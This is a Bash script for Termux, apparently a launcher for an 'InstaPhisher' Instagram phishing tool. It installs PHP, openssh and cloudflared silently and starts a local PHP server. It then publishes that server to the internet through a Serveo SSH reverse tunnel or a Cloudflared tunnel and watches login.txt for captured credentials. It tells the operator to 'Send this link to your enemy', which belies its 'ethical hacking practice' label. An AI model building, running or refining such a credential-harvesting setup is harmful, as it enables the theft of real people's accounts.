#!/bin/bash

Colors

RED='\033[1;31m' GRN='\033[1;32m' CYAN='\033[1;36m' YEL='\033[1;33m' NC='\033[0m'

Clear screen

clear

Gradient Colors

GRADIENT=( '\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m' )

Install figlet and lolcat silently

pkg install figlet -y > /dev/null 2>&1 pkg install toilet -y > /dev/null 2>&1 pkg install ruby -y > /dev/null 2>&1 gem install lolcat > /dev/null 2>&1

Typing animation function

type_effect() { text=$1 delay=${2:-0.07} for ((i=0; i<${#text}; i++)); do printf "%s" "${text:$i:1}" sleep "$delay" done echo "" }

Print "InstaPhisher" big, one-line, animated

echo "" figlet -f slant "InstaPhisher" | lolcat -a -d 4

Define rainbow colors

COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m')

Function for rainbow typing animation

rainbow_type() { text="$1" delay=${2:-0.03} color_index=0

for ((i=0; i<${#text}; i++)); do char="${text:$i:1}" color="${COLORS[$color_index]}" echo -en "${color}${char}${NC}" sleep "$delay" ((color_index=(color_index+1)%${#COLORS[@]})) done echo "" }

Rainbow animated subtitle

rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" 0.03 rainbow_type "Created by: SACHIN BADASRA" 0.04 echo ""

Check if requirements already installed

if [ -f "$HOME/.mytool_installed" ]; then echo -e "${GRN}[*] Requirements already installed. Skipping setup...${NC}" else echo -e "${GRN}[+] Installing requirements...${NC}" pkg update -y > /dev/null 2>&1

# Install dependencies
for pkg in php openssh git cloudflared; do
    if ! command -v $pkg > /dev/null 2>&1; then
        pkg install $pkg -y > /dev/null 2>&1
    fi
done

touch "$HOME/.mytool_installed"
echo -e "${GRN}[+] Requirements installation complete.${NC}"

fi

start_localhost() { echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null }

start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & sleep 1 echo -e "${GRN}[+] Starting Serveo tunnel...${NC}" ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 & sleep 2 SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*\.serveo.net" serveo.log) if [ ! -z "$SERVEO_URL" ]; then echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}" echo -e "${CYAN}[@]Send this link to your enemy${NC}" echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to get Serveo URL. Check SSH connection.${NC}" fi }

start_cloudflared() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}" cloudflared tunnel --url http://127.0.0.1:8080 > cloudflared.log 2>&1 & sleep 3 CLOUDFLARE_URL=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" cloudflared.log) if [ ! -z "$CLOUDFLARE_URL" ]; then echo -e "${GRN}[+] Phishing Page Live at: $CLOUDFLARE_URL${NC}" echo -e "${CYAN}[@]Send this link to your enemy${NC}" echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}" tail -n 0 -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to fetch Cloudflared URL.${NC}" fi }

Menu

echo -e "${CYAN}Choose Port Forwarding Method:${NC}" echo "1) Localhost (only for same device or network)" echo "2) Serveo.net (public URL)" echo "3) Cloudflared (public URL)" read -p $'\n>> ' choice

case $choice in 1) start_localhost;; 2) start_serveo;; 3) start_cloudflared;; *) echo -e "${RED}[!] Invalid option. Exiting.${NC}"; exit 1;; esac

